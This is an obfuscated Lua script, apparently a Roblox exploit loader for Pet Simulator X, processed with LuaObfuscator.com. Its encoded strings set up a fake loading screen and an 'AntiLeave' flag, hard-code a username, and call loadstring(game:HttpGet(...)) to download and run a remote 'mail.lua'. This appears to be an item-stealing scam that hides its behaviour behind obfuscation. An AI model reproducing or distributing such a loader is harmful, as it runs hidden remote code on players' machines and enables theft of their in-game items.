--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v75=0;while true do if (v75==0) then v19=v0(v3(v30,1,1));return "";end end else local v76=v2(v0(v30,16));if v19 then local v98=v5(v76,v19);v19=nil;return v98;else return v76;end end end);local function v20(v31,v32,v33)if v33 then local v77=0 -0 ;local v78;while true do if (v77==(485 -(242 + 243))) then v78=(v31/((8 -6)^(v32-(2 -1))))%((2 + 0)^(((v33-((2341 -(938 + 977)) -(80 + (708 -363)))) -(v32-(4 -(2 + 1)))) + 1 + 0)) ;return v78-(v78%(2 -1)) ;end end else local v79=(170 -(93 + 75))^(v32-(1 + 0 + 0)) ;return (((v31%(v79 + v79))>=v79) and (1 -0)) or (0 -0) ;end end local function v21()local v34=543 -(413 + 130) ;local v35;while true do if (v34==(0 -0)) then v35=v1(v16,v18,v18);v18=v18 + ((580 -(74 + 503)) -2) ;v34=853 -(724 + 128) ;end if (v34==(1 + 0)) then return v35;end end end local function v22()local v36=0 + 0 ;local v37;local v38;while true do if (v36==((1927 -(1065 + 861)) -0)) then return (v38 * (1164 -908)) + v37 ;end if (v36==0) then v37,v38=v1(v16,v18,v18 + (1307 -(1061 + 244)) );v18=v18 + (5 -(1 + 2)) ;v36=1887 -(133 + 569 + 1184) ;end end end local function v23()local v39=0 + 0 ;local v40;local v41;local v42;local v43;while true do if (v39==(0 -0)) then v40,v41,v42,v43=v1(v16,v18,v18 + 3 + 0 );v18=v18 + (1246 -(1174 + 68)) ;v39=3 -2 ;end if (v39==(1 -0)) then return (v43 * (16778948 -((2735 -(1371 + 304)) + 672))) + (v42 * (67396 -(707 + 1153))) + (v41 * (178 + 78)) + v40 ;end end end local function v24()local v44=0 -0 ;local v45;local v46;local v47;local v48;local v49;local v50;while true do if (v44==0) then v45=v23();v46=v23();v44=1;end if (v44==(1340 -(472 + (2760 -(860 + 1034))))) then v49=v20(v46,13 + 8 ,23 + 8 );v50=((v20(v46,66 -34 )==((2 + 1) -2)) and  -(2 -1)) or ((122 -(112 + 9)) -0) ;v44=3 + 0 ;end if (v44==(2 + 1)) then if (v49==(0 + 0)) then if (v48==(1725 -(1661 + 64))) then return v50 * (676 -(276 + 400)) ;else local v106=0;while true do if (((0 -0) + (0 -0))==v106) then v49=1;v47=0 + 0 ;break;end end end elseif (v49==(2377 -(56 + 274))) then return ((v48==(0 + (0 -0))) and (v50 * ((1299 -(100 + 1198))/(0 + 0 + 0)))) or (v50 * NaN) ;end return v8(v50,v49-(709 + 314) ) * (v47 + (v48/((2 -0)^((19 -12) + 45)))) ;end if ((1 + 0 + 0)==v44) then v47=(2995 -1117) -(1264 + 613) ;v48=(v20(v46,1731 -(947 + (2457 -1674)) ,13 + 7 ) * (((658 -(52 + 603)) -1)^(2 + 30))) + v45 ;v44=1 + 1 ;end end end local function v25(v51)local v52;if  not v51 then v51=v23();if (v51==(0 -0)) then return "";end end v52=v3(v16,v18,(v18 + v51) -(1 + 0) );v18=v18 + v51 ;local v53={};for v68=2 -1 , #v52 do v53[v68]=v2(v1(v3(v52,v68,v68)));end return v6(v53);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v54=0 + 0 ;local v55;local v56;local v57;local v58;local v59;local v60;local v61;while true do if (v54==(1 + 0)) then local v90=1888 -(963 + 925) ;while true do if (v90==(1 + 0)) then v54=1667 -(263 + 1402) ;break;end if (v90~=(0 + 0)) then else local v105=1024 -(852 + 172) ;while true do if ((0 + 0)==v105) then v57=nil;v58=nil;v105=1 + 0 ;end if (v105==(1 + 0)) then v90=1;break;end end end end end if (v54~=(1809 -(726 + 1080))) then else v61=nil;while true do local v99=0 -0 ;local v100;while true do if (v99==(0 -0)) then v100=0;while true do if (v100==(452 -(421 + 30))) then if (v55==1) then local v108=1609 -(685 + 924) ;local v109;local v110;while true do if (v108~=(540 -(411 + 128))) then else while true do if (v109~=(0 + 0)) then else v110=0 + 0 ;while true do if (v110~=(2 -1)) then else v61={};v55=3 -1 ;break;end if (v110~=(65 -(10 + 55))) then else v59={v56,v57,nil,v58};v60=v23();v110=4 -3 ;end end break;end end break;end if ((0 -0)==v108) then v109=1570 -(609 + 961) ;v110=nil;v108=599 -(511 + 87) ;end end end if (v55==(1691 -(443 + 1248))) then local v111=23 -(14 + 9) ;local v112;local v113;while true do if (v111==(630 -(548 + 81))) then while true do if (v112==0) then v113=0 -0 ;while true do if (v113~=(34 -(28 + 5))) then else v58={};v55=1;break;end if (v113==0) then local v146=0 -0 ;local v147;while true do if (v146~=(0 + 0)) then else v147=1893 -(1181 + 712) ;while true do if (v147==(964 -(799 + 164))) then v113=1968 -(10 + 1957) ;break;end if (v147==(0 -0)) then local v167=516 -(511 + 5) ;while true do if (v167~=(1217 -(166 + 1050))) then else v147=4 -3 ;break;end if ((1908 -(1902 + 6))~=v167) then else v56={};v57={};v167=1 -0 ;end end end end break;end end end end break;end end break;end if (0~=v111) then else v112=0 -0 ;v113=nil;v111=1;end end end break;end if (v100==(0 + 0)) then local v107=507 -(145 + 362) ;while true do if ((231 -(171 + 59))==v107) then v100=1;break;end if (v107~=0) then else if (v55==(1997 -(376 + 1618))) then local v116=0 + 0 ;local v117;while true do if (v116==(886 -(251 + 635))) then v117=0;while true do local v123=1961 -(14 + 1947) ;local v124;while true do if (0~=v123) then else v124=1847 -(1363 + 484) ;while true do if (v124==0) then if ((0 + 0)==v117) then for v176=2 -1 ,v23() do v57[v176-1 ]=v28();end for v178=3 -2 ,v23() do v58[v178]=v23();end v117=1178 -(339 + 838) ;end if (v117==1) then return v59;end break;end end break;end end end break;end end end if (v55==(1314 -(1270 + 42))) then local v118=0;local v119;while true do if (v118==(0 -0)) then v119=334 -(292 + 42) ;while true do if (v119==1) then for v153=1,v23() do local v154=0;local v155;while true do if (0==v154) then v155=v21();if (v20(v155,1,1)~=0) then else local v168=0 -0 ;local v169;local v170;local v171;local v172;while true do if (v168==(1 -0)) then local v184=0 + 0 ;while true do if ((287 -(126 + 161))~=v184) then else v171=nil;v172=nil;v184=1 + 0 ;end if (v184==1) then v168=2;break;end end end if (v168==0) then local v185=0;local v186;while true do if (v185~=(91 -(31 + 60))) then else v186=0 -0 ;while true do if (v186==(1 + 0)) then v168=1;break;end if (v186~=(0 + 0)) then else local v199=0 + 0 ;while true do if (v199==(1921 -(158 + 1762))) then v186=843 -(323 + 519) ;break;end if (v199==0) then v169=0 + 0 ;v170=nil;v199=1433 -(1067 + 365) ;end end end end break;end end end if (v168~=(4 -2)) then else while true do if (v169==(2 + 0)) then local v187=0 -0 ;local v188;while true do if (v187==(1384 -(1055 + 329))) then v188=0;while true do if (v188~=(1635 -(184 + 1450))) then else v169=415 -(43 + 369) ;break;end if ((0 + 0)==v188) then local v200=0;while true do if (v200==1) then v188=1 + 0 ;break;end if (v200==0) then if (v20(v171,1 + 0 ,2 -1 )==(790 -(37 + 752))) then v172[201 -(23 + 176) ]=v61[v172[1254 -(1084 + 168) ]];end if (v20(v171,1227 -(1149 + 76) ,2)==(1 + 0)) then v172[11 -8 ]=v61[v172[3]];end v200=1;end end end end break;end end end if (v169==(749 -(654 + 94))) then local v189=0 -0 ;local v190;while true do if ((0 + 0)~=v189) then else v190=1963 -(643 + 1320) ;while true do if (v190==(1784 -(1327 + 456))) then v169=2 + 0 ;break;end if (v190~=(0 + 0)) then else local v201=0 -0 ;while true do if (v201~=(1 + 0)) then else v190=4 -3 ;break;end if ((0 + 0)==v201) then v172={v22(),v22(),nil,nil};if (v170==0) then local v208=940 -(141 + 799) ;local v209;local v210;while true do if (v208~=1) then else while true do if (v209==(0 + 0)) then v210=0 + 0 ;while true do if (v210==(1786 -(956 + 830))) then v172[3 -0 ]=v22();v172[4]=v22();break;end end break;end end break;end if (v208==0) then local v212=0 -0 ;while true do if (v212==0) then v209=208 -(138 + 70) ;v210=nil;v212=1163 -(851 + 311) ;end if (1~=v212) then else v208=1 + 0 ;break;end end end end elseif (v170==(1875 -(1511 + 363))) then v172[2 + 1 ]=v23();elseif (v170==2) then v172[3]=v23() -((6 -4)^(36 -20)) ;elseif (v170==(2 + 1)) then local v214=0 + 0 ;while true do if (v214==(0 -0)) then v172[3]=v23() -((2 + 0)^(38 -22)) ;v172[14 -10 ]=v22();break;end end end v201=1 + 0 ;end end end end break;end end end if (v169==(6 -3)) then if (v20(v171,7 -4 ,4 -1 )==(1029 -(131 + 897))) then v172[315 -(66 + 245) ]=v61[v172[3 + 1 ]];end v56[v153]=v172;break;end if (v169==(775 -(585 + 190))) then local v192=0 + 0 ;local v193;local v194;while true do if ((0 -0)==v192) then v193=0 -0 ;v194=nil;v192=2 -1 ;end if (v192~=1) then else while true do if (v193~=(0 + 0)) then else v194=0 + 0 ;while true do if (v194==(0 + 0)) then local v202=0 -0 ;local v203;while true do if (v202==(0 -0)) then v203=0 + 0 ;while true do if (v203~=(0 -0)) then else v170=v20(v155,2,332 -(291 + 38) );v171=v20(v155,699 -(625 + 70) ,1490 -(415 + 1069) );v203=1475 -(480 + 994) ;end if (v203==(2 -1)) then v194=1 + 0 ;break;end end break;end end end if (v194==(1 + 0)) then v169=1724 -(1513 + 210) ;break;end end break;end end break;end end end end break;end end end break;end end end v55=405 -(84 + 318) ;break;end if (v119==(1241 -(878 + 363))) then local v148=0;while true do if (v148==(0 -0)) then for v158=1,v60 do local v159=0 + 0 ;local v160;local v161;while true do if (v159==(1 -0)) then if (v160==(2 -1)) then v161=v21()~=(0 -0) ;elseif (v160==(1634 -(575 + 1057))) then v161=v24();elseif (v160~=(1486 -(177 + 1306))) then else v161=v25();end v61[v158]=v161;break;end if (v159==(0 -0)) then local v181=0 + 0 ;while true do if (v181~=(0 + 0)) then else v160=v21();v161=nil;v181=1;end if (1~=v181) then else v159=1;break;end end end end end v59[176 -(13 + 160) ]=v21();v148=1 -0 ;end if (v148==(4 -3)) then v119=1;break;end end end end break;end end end v107=2 -1 ;end end end end break;end end end break;end if (v54==(0 + 0)) then local v91=0 + 0 ;while true do if (1~=v91) then else v54=1 + 0 ;break;end if (v91==(0 + 0)) then v55=0;v56=nil;v91=1 -0 ;end end end if (v54~=(2 + 0)) then else local v92=0 + 0 ;while true do if (v92==(1 + 0)) then v54=3 + 0 ;break;end if (v92==(0 -0)) then v59=nil;v60=nil;v92=342 -(5 + 336) ;end end end end end local function v29(v62,v63,v64)local v65=v62[1];local v66=v62[2];local v67=v62[3];return function(...)local v70=1;local v71= -1;local v72={...};local v73=v12("#",...) -1 ;local function v74()local v80=v65;local v81=v66;local v82=v67;local v83=v27;local v84={};local v85={};local v86={};for v93=0 + 0 ,v73 do if (((3922 -(653 + 67))>(736 + 734 + 1202)) and (v93>=v82)) then v84[v93-v82 ]=v72[v93 + (2 -1) ];else v86[v93]=v72[v93 + (232 -(210 + 21)) ];end end local v87=(v73-v82) + ((3070 -1180) -(1432 + 457)) ;local v88;local v89;while true do local v94=246 -(117 + 129) ;local v95;local v96;while true do if ((v94==(441 -(196 + 245))) or ((943 + 1599)>=(3275 -(148 + 74)))) then v95=(0 + 0) -0 ;v96=nil;v94=1 + 0 + 0 ;end if (((2 -1)==v94) or (504==(5011 -(379 + 16)))) then while true do if ((v95==(0 -0)) or (((13168 -(615 + 797)) -7401)<(3158 -(237 + 733)))) then v96=(374 -(181 + 193)) + 0 ;while true do if ((63<(2701 + 143)) and (v96==1)) then if ((((554 -(23 + 163)) + 853)<=3471) and (v89<=(527 -(55 + 467)))) then if ((4023==(8203 -4180)) and (v89<=(2 + 0))) then if (((798 + 224)<=4045) and (v89<=(0 + 0))) then if (((3296 -(668 + 984))==(3911 -2267)) and (v88[(2 + 1) -1 ]==v86[v88[1093 -(1088 + 1) ]])) then v70=v70 + 1 ;else v70=v88[7 -4 ];end elseif ((((7797 -(295 + 626)) -2892)==((6796 -(565 + 1163)) -(630 + 454))) and (v89==(1 -0))) then v86[v88[510 -(407 + (275 -174)) ]]=v88[1831 -((785 -553) + 1596) ];else v64[v88[9 -6 ]]=v86[v88[331 -(146 + 183) ]];end elseif (((5863 -(661 + 885))>(76 -29)) and (v89<=(3 -0))) then v86[v88[1 + 1 + 0 ]]();elseif ((v89>(1071 -(38 + 362 + 667))) or ((1761 + (1939 -899))<((514 + 2025) -1211))) then v86[v88[2 -0 ]]=v64[v88[2 + 1 + 0 ]];else v86[v88[1 + 1 ]]=v88[1 + 2 ]~=(771 -(349 + 422)) ;end elseif ((v89<=(12 -4)) or ((4769 -(1054 + 409))>=(15378 -11501))) then if ((1713<=3166) and (v89<=(13 -(15 -8)))) then local v120=1178 -(183 + 995) ;local v121;while true do if ((v120==0) or ((365 + 2107)>=(3956 -(228 + 456)))) then v121=v88[2];v86[v121]=v86[v121](v13(v86,v121 + ((52 -(35 + 15)) -1) ,v71));break;end end elseif ((v89>(869 -(132 + 730))) or (1036>=(8694 -5017))) then local v133=772 -(287 + (1032 -547)) ;local v134;local v135;local v136;local v137;local v138;while true do if (((4277 -(633 + 68))>=((3677 + 1279) -(1440 + 239))) and (v133==(4 -2))) then v138=nil;while true do if ((v134==(639 -(446 + (513 -322)))) or ((1819 + 34)<(3238 -(1551 + 397)))) then for v173=v135,v71 do local v174=22 -((94 -74) + (939 -(757 + 180))) ;local v175;while true do if (((7213 -3555)<=(11168 -7060)) and (v174==(0 + 0))) then v175=790 -(722 + 68) ;while true do if ((3739>((8968 -5154) -(49 + 149))) and (v175==(0 + 0))) then v138=v138 + 1 + 0 ;v86[v173]=v136[v138];break;end end break;end end end break;end if ((v134==(0 + 0)) or ((84 + 404)>=678)) then v135=v88[1649 -(1458 + 189) ];v136,v137=v83(v86[v135](v13(v86,v135 + (601 -((333 -(155 + 135)) + 557)) ,v88[(2025 -(1182 + 140)) -(145 + 555) ])));v134=1 + 0 ;end if ((v134==(1 + 0 + 0)) or (2338>=(572 + 3436))) then v71=(v137 + v135) -(1 + 0) ;v138=573 -(361 + 212) ;v134=3 -1 ;end end break;end if ((v133==(1 + 0 + 0)) or ((1959 -(344 + (1034 -(54 + 45))))>4259)) then v136=nil;v137=nil;v133=2;end if ((v133==(0 + 0)) or ((203 + 2585)<=(2599 -1870))) then v134=1956 -(1337 + 370 + 249) ;v135=nil;v133=1;end end elseif ((((10218 -6786) -(897 + 1069))<(2618 -1076)) and (v86[v88[2 -0 ]]==v88[3 + (2 -1) ])) then v70=v70 + (1997 -(1599 + 397)) + 0 ;else v70=v88[3 + (0 -0) ];end elseif (((8580 -4327)>(5690 -2433)) and (v89<=(30 -20))) then if (((958 + 1807)>((11903 -8892) -(1771 + 4))) and (v89>9)) then do return;end else local v139=0 -(1716 -(7 + 1709)) ;local v140;local v141;local v142;while true do if (((4564 -(1770 + 41))>((2085 -(491 + 1207)) + 1360)) and ((2 -1)==v139)) then v142=nil;while true do if (((4998 -(30 + 678))>=(3097 -(874 + 331))) and (v140==(1 + 0))) then v86[v141 + 1 + 0 ]=v142;v86[v141]=v142[v88[4]];break;end if ((v140==(0 -0)) or (1468>=(5256 -(137 + 464)))) then local v166=(186 + 1515) -(549 + 1152) ;while true do if (((413 + 1029)==(928 + 514)) and (v166==(1 -(1475 -(433 + 1042))))) then v140=(1 -0) -(0 + 0) ;break;end if ((v166==(730 -(340 + 390))) or ((4785 -1927)<=(6 + 25 + 536))) then v141=v88[1766 -(452 + 1312) ];v142=v86[v88[1181 -(109 + (3547 -2478)) ]];v166=1 + 0 ;end end end end break;end if ((((694 -(11 + 295)) + 3876)==(5809 -(1091 + 454))) and ((0 + 0)==v139)) then v140=0;v141=nil;v139=1;end end end elseif ((v89>11) or ((101 + 110)==(1462 -(4277 -3142)))) then v86[v88[147 -(124 + 21) ]][v88[1 + 2 ]]=v88[14 -10 ];else v70=v88[1856 -(1358 + 495) ];end v70=v70 + (2 -1) ;break;end if ((v96==((0 -0) + 0)) or ((2715 -1659)>(3828 -(15 + 240)))) then local v114=0 + 0 ;local v115;while true do if ((v114==(0 + 0)) or ((432 + 225)<=(724 -360))) then v115=0 + 0 ;while true do if (((3753 -2978)<(31 + 1844)) and (v115==(1048 -(809 + (871 -(535 + 97)))))) then local v122=0 + 0 ;while true do if (((1 + 0)==v122) or ((10412 -(6712 + 888))<=(1365 -((1973 -(544 + 933)) + 351)))) then v115=3 -2 ;break;end if (((17380 -12894)==(1519 + 2967)) and ((0 -0)==v122)) then v88=v80[v70];v89=v88[1269 -(558 + 710) ];v122=292 -(24 + 267) ;end end end if (((162 + 1368 + 1183)>2068) and (v115==(162 -(80 + 81)))) then v96=930 -(490 + 439) ;break;end end break;end end end end break;end end break;end end end end A,B=v27(v11(v74));if  not A[1] then local v97=v62[4][v70] or "?" ;error("Script error at ["   .. v97   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!1A3O00028O00026O00F03F03023O005F4703093O00416E74694C656176652O0103093O004D6F7573654C6F636B027O0040026O000840030A3O005365636F6E645465787403113O00536372697074204C6F6164696E673O2E03093O00546869726454657874030E3O00416C6D6F737420446F6E653O2E026O001040030B3O0057616974696E6754696D65025O00806640030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4D61736B6F757431352F70657473696D7874657374322F6D61696E2F6D61696C2E6C7561030A3O005363726970744E616D65030C3O0052692O7A205363726970747A03093O0046697273745465787403103O0053637269707420507265706172696E6703083O00557365724E616D65030A3O0073657068735472613368030D3O004C6F6164696E675363722O656E002C3O0012013O00013O0026073O00080001000200040B3O00080001001205000100033O00300C000100040005001205000100033O00300C0001000600050012013O00073O0026073O000F0001000800040B3O000F0001001205000100033O00300C00010009000A001205000100033O00300C0001000B000C0012013O000D3O000E2O000D001C00013O00040B3O001C0001001205000100033O00300C0001000E000F001205000100103O001205000200113O002009000200020012001201000400134O0004000500014O0008000200054O000600013O00022O000300010001000100040B3O002B00010026073O00230001000700040B3O00230001001205000100033O00300C000100140015001205000100033O00300C0001001600170012013O00083O0026073O00010001000100040B3O00010001001201000100193O001202000100183O001205000100033O00300C0001001A00050012013O00023O00040B3O000100012O000A3O00017O002C3O00023O00043O00043O00053O00053O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000E3O000E3O000F3O000F3O00103O00103O00103O00103O00103O00103O00103O00103O00113O00133O00133O00143O00143O00153O00153O00163O00183O00183O00193O00193O001A3O001A3O001B3O001C3O001E3O00",v9(),...);end